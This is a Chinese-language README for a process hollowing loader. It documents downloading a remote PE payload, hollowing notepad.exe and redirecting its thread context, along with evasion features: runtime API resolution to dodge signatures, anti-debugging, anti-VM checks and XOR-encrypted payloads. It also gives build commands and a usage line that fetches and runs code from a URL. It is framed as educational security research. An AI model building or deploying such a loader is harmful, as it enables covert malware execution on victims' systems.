# Process Hollowing (进程镂空) 实现文档

本项目实现了一个完整的 C++ 进程镂空程序，支持 32 位和 64 位 PE 文件，并集成了多种安全与反分析技术。代码经过模块化重构，并附带详尽的中文注释，非常适合作为 Windows 底层安全技术的学习参考。

## 功能特性

1.  **远程下载**: 支持通过 HTTP/HTTPS 协议从远程服务器下载 PE Payload（自动处理 SSL/TLS 标志）。
2.  **进程创建**: 使用 `CreateProcessA` 以 `CREATE_SUSPENDED` 模式创建合法的宿主进程（默认 `notepad.exe`）。
3.  **镂空技术**:
    *   动态获取 `ntdll!NtUnmapViewOfSection` 卸载目标进程原始内存镜像。
    *   使用 `VirtualAllocEx` 在目标进程中分配新内存（支持首选地址失败后的重分配）。
    *   手动映射 PE 头和各个节区（Sections）。
4.  **基址重定位 (Relocation)**: 自动解析 `.reloc` 节，根据实际加载地址修正所有硬编码的绝对地址。
5.  **上下文切换**: 修正线程上下文（`EAX/RAX` 指向新的入口点，更新 `PEB` 中的镜像基址），接管执行权。
6.  **动态 API 解析**: 采用单例模式的 `APIResolver` 在运行时动态获取系统 API 地址，避开静态导入表特征。
7.  **反分析技术**: 集成反调试（IsDebuggerPresent）与反虚拟机（关键驱动检测）。
8.  **数据安全**: 实现 XOR 加解密逻辑，Payload 可在加密状态下传输。
9.  **全中文注释**: 代码中包含极其详尽的中文注释，解释了每一个底层步骤的原理。

## 项目结构 (模块化)

- **`include/` (头文件)**
    - `Common.h`: 公共结构体、日志宏及 `APIResolver` 类定义。
    - `Network.h`: 网络下载模块定义。
    - `PEParser.h`: PE 解析与验证模块定义。
    - `Security.h`: 环境检测与加密模块定义。
    - `HollowingCore.h`: 镂空核心逻辑模块定义。
- **`src/` (源代码)**
    - `Common.cpp`: 动态 API 解析的具体实现。
    - `Network.cpp`: 基于 WinInet 的 HTTP/HTTPS 下载实现。
    - `PEParser.cpp`: PE 格式合法性校验实现。
    - `Security.cpp`: 反调试、反虚拟机及 XOR 运算实现。
    - `HollowingCore.cpp`: 内存映射、重定位修复及上下文控制实现。
- **`main.cpp`**: 程序入口，负责组织业务流程。

## 编译与运行

### 编译环境
建议编译架构（x86/x64）与你的目标 Payload 保持一致。

#### 1. 使用 GCC (MinGW-w64) 编译
这是推荐的编译方式，支持一键生成静态链接的可执行文件。

**通用编译命令：**
```bash
g++ main.cpp src/Common.cpp src/PEParser.cpp src/Network.cpp src/Security.cpp src/HollowingCore.cpp -I. -o ProcessHollowing.exe -lwininet -static -finput-charset=UTF-8 -fexec-charset=GBK
```

**针对不同架构的说明：**
- **编译 64 位版本**: 使用 `x86_64-w64-mingw32-g++`（或默认的 `g++`，如果你的环境是 64 位）。
- **编译 32 位版本**: 使用 `i686-w64-mingw32-g++`。建议在 32 位编译时加入 `-m32` 标志。

**自动化编译脚本 (build.bat):**
你可以创建一个 `build.bat` 文件并粘贴以下内容，双击即可编译：
```batch
@echo off
echo [*] Compiling ProcessHollowing...
g++ main.cpp src/Common.cpp src/PEParser.cpp src/Network.cpp src/Security.cpp src/HollowingCore.cpp -I. -o ProcessHollowing.exe -lwininet -static
if %errorlevel% equ 0 (
    echo [+] Compilation successful: ProcessHollowing.exe
) else (
    echo [-] Compilation failed!
)
pause
```

#### 2. 使用 MSVC (Visual Studio) 编译
- 确保包含所有 `.h` 和 `.cpp` 文件。
- 链接 `wininet.lib`。
- 建议将“运行库”设置为 `多线程 (/MT)`。

### 运行说明
```bash
ProcessHollowing.exe <Payload_URL> [Target_Process_Path]
```
- `Payload_URL`: 远程 PE 文件的下载链接。
- `Target_Process_Path`: (可选) 宿主进程，默认为 `C:\Windows\System32\notepad.exe`。

## 技术细节说明

### 基址重定位 (Relocation)
当 Payload 无法加载到其 `ImageBase` 指定的地址时，必须进行重定位。我们通过遍历 `IMAGE_DIRECTORY_ENTRY_BASERELOC` 目录，计算 `Delta = 实际分配地址 - 期望地址`，并对所有需要修正的地址进行累加偏移。

### 线程上下文更新
- **X64**: 修改 `ctx.Rax` 为入口点，同时更新 `ctx.Rdx + 0x10` (PEB 中的镜像基址)。
- **X86**: 修改 `ctx.Eax` 为入口点，同时更新 `ctx.Ebx + 0x8` (PEB 中的镜像基址)。

## 安全提示
本项目仅供教育和安全研究使用。请勿将其用于任何非法活动。使用者需对产生的后果承担全部法律责任。
